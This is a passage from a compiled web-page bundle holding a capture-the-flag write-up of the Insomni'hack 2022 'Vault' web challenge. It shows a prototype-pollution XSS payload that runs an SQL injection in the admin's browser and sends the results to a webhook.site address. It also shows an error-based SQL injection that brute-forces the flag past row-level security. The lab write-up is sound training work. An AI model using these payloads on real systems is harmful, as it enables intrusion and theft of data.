punctuation\",children:\":\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'OK'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'results'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),\"ret\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"except\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'status'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'NOK'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"We continue by adding an injection to our payload \",(0,n.jsx)(e.code,{children:`fetch(\"/api/stats?username=admin' union select 123 --\").then(x => x.text()).then(x=>{location='https://webhook.site/32903bb4-075a-4196-933d-2d558ae4a216/?secrets='+btoa(x)})`}),\" but we base64 it and then eval the decoded value in order for it to work:\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{className:\"code-highlight\",children:(0,n.jsx)(e.span,{className:\"code-line\",children:`http://vault.insomnihack.ch:5000/?__proto__[url][]=data:,eval(atob(%27ZmV0Y2goIi9hcGkvc3RhdHM/dXNlcm5hbWU9YWRtaW4nIHVuaW9uIHNlbGVjdCAxMjMgLS0iKS50aGVuKHggPT4geC50ZXh0KCkpLnRoZW4oeD0%2be2xvY2F0aW9uPSdodHRwczovL3dlYmhvb2suc2l0ZS8zMjkwM2JiNC0wNzVhLTQxOTYtOTMzZC0yZDU1OGFlNGEyMTYvP3NlY3JldHM9JytidG9hKHgpfSk7%27))//&__proto__[dataType]=script#page=secrets\n`})})}),`\n`,(0,n.jsx)(e.p,{children:\"\\u2026and get a callback as shown below:\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/insomnihack-teaser-2022/successful_injection.png\",alt:\"successful_injection\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"After several failed attempts of selecting the flag from the database we notice that \",(0,n.jsx)(e.code,{children:\"install.sql\"}),\" has a \",(0,n.jsx)(e.code,{children:\"SecurityPredicate\"}),\" which prevents access from different users to specific rows:\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-sql\",children:(0,n.jsxs)(e.code,{className:\"language-sql code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"DROP\"}),\" SECURITY POLICY \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"IF\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"EXISTS\"}),\" dbo\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"SecurityPolicy\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`GO\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"DROP\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"FUNCTION\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"IF\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"EXISTS\"}),\" dbo\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"SecurityPredicate\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`GO\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"CREATE\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"FUNCTION\"}),\" dbo\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),`SecurityPredicate\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token variable\",children:\"@UserName\"}),\" nvarchar\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"32\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"RETURNS\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"TABLE\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"WITH\"}),` SCHEMABINDING\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"AS\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"RETURN\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"SELECT\"}),\" ok \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"WHERE\"}),\" USER_NAME\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token variable\",children:\"@UserName\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`GO\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"CREATE\"}),\" SECURITY POLICY dbo\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),`SecurityPolicy\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"ADD\"}),\" FILTER PREDICATE dbo\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"SecurityPredicate\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"UserName\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"ON\"}),\" dbo\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"Vault \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"WITH\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"STATE \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"ON\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" SCHEMABINDING \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"ON\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`GO\n`})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"After some researching, I find this article named \",(0,n.jsx)(e.a,{href:\"https://www.mssqltips.com/sqlservertip/4379/beware-of-sidechannel-attacks-in-rowlevel-security-in-sql-server-2016/\",children:\"Beware of Side-Channel Attacks in Row-Level Security in SQL Server 2016\"}),\" explaining how to bypass this Predicate by causing an error like a zero division error so we tried to cause an error while trying to bruteforce each character of the flag.\"]}),`\n`,(0,n.jsx)(e.p,{children:\"Unfortunately, the CTF ended at this time and didn\\u2019t manage to finish the challenge on time but the injection required is shown below:\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-sql\",children:(0,n.jsx)(e.code,{className:\"language-sql code-highlight\",children:(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"select\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"from\"}),\" dbo\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"Vault \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"where\"}),\" username\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'secret'\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"and\"}),\" secret_name\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'flag'\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"and\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"/\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"ascii\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"substring\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"secret_value\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),\"GUESS\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),`\n`]})})}),`\n`,(0,n.jsx)(e.p,{children:\"Finally what needs to be done is just looping through the characters of secret_value and sending for each one this payload:\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-js\",children:(0,n.jsx)(e.code,{className:\"language-js code-highlight\",children:(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token function\",children:\"fetch\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'/api/stats?username=${encodeURIComponent('\"}),\" union select \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword module\",children:\"from\"}),\" dbo\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token property-access\",children:(0,n.jsx)(e.span,{className:\"token maybe-class-name\",children:\"Vault\"})}),\" where username\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'secret'\"}),\" and secret_name\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'flag'\"}),\" and \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"/\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"ascii\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"substring\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"secret_value\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\"$\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),\"pos\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),(0,n.jsx)(e.span,{className:\"token constant\",children:\"GUESS\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"--\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),\"'\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\"`\\n\"]})})})]})}}var b=w;return f;})();\n;return Component;","toc":[{"value":"Vault","url":"#vault","depth":2}],"frontMatter":{"readingTime":{"text":"6 min read","minutes":5.775,"time":346500,"words":1155},"slug":"insomni-hack-teaser-2022/vault","fileName":"insomni-hack-teaser-2022/vault.md","title":"Insomni'hack teaser 2022 – Vault","date":"2022-01-31T00:00:00.000Z","draft":false,"authors":["thebish0p"],"tags":["Insomni'hack teaser 2022","Web","Prototype Pollution","SQLi","Error Based Injection","JavaScript","JSON"],"summary":"Prototype pollution which allows to run arbitrary js in admin context and retrieve the flag through the sql injection with an error based injection."}},"authorDetails":[{"readingTime":{"text":"1 min read","minutes":0.18,"time":10800,"words":36},"slug":["thebish0p"],"fileName":"thebish0p.md","name":"thebish0p","avatar":"https://www.gravatar.com/avatar/4bbe2c02b2eb4589f0ef3c2d0e39a640?d=identicon&s=256","specialties":["Web"],"linkedin":"https://linkedin.com/in/eliemoutran","github":"https://github.com/eliemoutran","member":true,"retired":true,"description":"Security, Programming and Mathematics","order":2,"date":null}],"prev":{"title":"Insomni'hack teaser 2022 – AndroNotes","date":"2022-01-30T00:00:00.000Z","draft":false,"authors":["blueset"],"tags":["Insomni'hack teaser 2022","Forensics","Android"],"summary":"A rooted Android phone could be handy sometimes.","slug":"insomni-hack-teaser-2022/andronotes"},"next":{"title":"Insomni'hack teaser 2022 – DrJeb","date":"2022-01-31T00:00:00.000Z","draft":false,"authors":["thebish0p"],"tags":["Insomni'hack teaser 2022","Misc","Git","OSINT"],"summary":"Git repo secret.","slug":"insomni-hack-teaser-2022/drjeb"}},"__N_SSG":true}